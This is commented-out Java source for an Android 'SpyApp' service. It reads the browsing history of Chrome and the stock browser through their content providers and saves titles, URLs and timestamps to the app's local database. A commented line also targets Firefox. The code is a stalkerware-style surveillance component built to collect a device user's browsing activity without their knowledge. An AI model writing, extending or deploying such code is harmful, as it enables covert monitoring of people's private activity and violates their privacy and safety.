//package com.app.spyapp.service;
//
//import android.app.IntentService;
//import android.content.Intent;
//import android.database.Cursor;
//import android.net.Uri;
//import android.provider.Browser;
//import android.text.TextUtils;
//
//import com.app.spyapp.SpyApp;
//import com.app.spyapp.common.Const;
//import com.app.spyapp.common.Utils;
//import com.app.spyapp.model.BrowserModel;
//
//import java.util.ArrayList;
//import java.util.Date;
//
//
//public class HistoryService extends IntentService {
//    private ArrayList<BrowserModel> defaultbrowserHistorylist;
//    private ArrayList<BrowserModel> chromeBroswerHistoryList;
//    private SpyApp spyApp;
//
//    /**
//     * Creates an IntentService.  Invoked by your subclass's constructor.
//     */
//    public HistoryService() {
//        super(HistoryService.class.getSimpleName());
//    }
//
//    @Override
//    protected void onHandleIntent(Intent intent) {
//        Utils.showStatus(this, "HISTORY");
//        spyApp = (SpyApp) getApplicationContext();
//        boolean isChromeInstall = Utils.isPackageInstalled("com.android.chrome", this);
//        if (isChromeInstall) {
//            chromeBroswerHistoryList = getHistoryList("content://com.android.chrome.browser/bookmarks", Const.TYPE_CHROME);
//            if (chromeBroswerHistoryList != null && chromeBroswerHistoryList.size() > 0) {
//                for (int i = 0; i < chromeBroswerHistoryList.size(); i++) {
//                    spyApp.getDatabaseHelper().insertHistory(chromeBroswerHistoryList.get(i));
//                }
//            }
//        }
//        boolean isBrowserInstall = Utils.isPackageInstalled("com.android.browser", this);
//        if (isBrowserInstall) {
//            defaultbrowserHistorylist = getHistoryList("content://browser/bookmarks", Const.TYPE_DEFAULT);
//            if (defaultbrowserHistorylist != null && defaultbrowserHistorylist.size() > 0) {
//                for (int i = 0; i < defaultbrowserHistorylist.size(); i++) {
//                    spyApp.getDatabaseHelper().insertBookmark(defaultbrowserHistorylist.get(i));
//                }
//            }
//        }
//
//    }
//
//
//    private ArrayList<BrowserModel> getHistoryList(String uri, String type) {
//
//        ArrayList<BrowserModel> broswerList = new ArrayList<>();
//        String selection = Browser.BookmarkColumns.BOOKMARK + " = 0";
//        StringBuffer sb = new StringBuffer();
//        String[] proj = new String[]{Browser.BookmarkColumns._ID, Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.DATE};
//        Uri uriCustom = Uri.parse(uri);
////        Uri uriCustom = Uri.parse("content://org.mozilla.firefox.db.browser/bookmarks");
//        Cursor cursor = getContentResolver().query(uriCustom, proj, selection, null, Browser.BookmarkColumns.DATE + " DESC");
//        cursor.moveToFirst();
//
//        if (cursor.moveToFirst() && cursor.getCount() > 0) {
//            boolean cont = true;
//            sb.append("Browse Details :");
//            while (cursor.isAfterLast() == false && cont) {
//                String date = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.DATE));
//                String callDayTime = "";
//                if (!TextUtils.isEmpty(date)) {
//                    callDayTime = Utils.convertMilisToDate(Long.parseLong(date));
//                }
//                String id = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns._ID));
//                String title = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.TITLE));
//                String url = cursor.getString(cursor.getColumnIndex(Browser.BookmarkColumns.URL));
//                // Do something with title and url
//                BrowserModel browserModel = new BrowserModel();
//                browserModel.setBookmarkid(id);
//                browserModel.setTitle(title);
//                browserModel.setUrl(url);
//                browserModel.setType(type);
//                browserModel.setDatetime(callDayTime);
//                broswerList.add(browserModel);
//                sb.append("\nTitle:--- " + title + " \nURL:--- " + url + " \nDate:--- " + callDayTime);
//                sb.append("\n----------------------------------");
//                cursor.moveToNext();
//            }
//            return broswerList;
//        }
//        return null;
//    }
//}
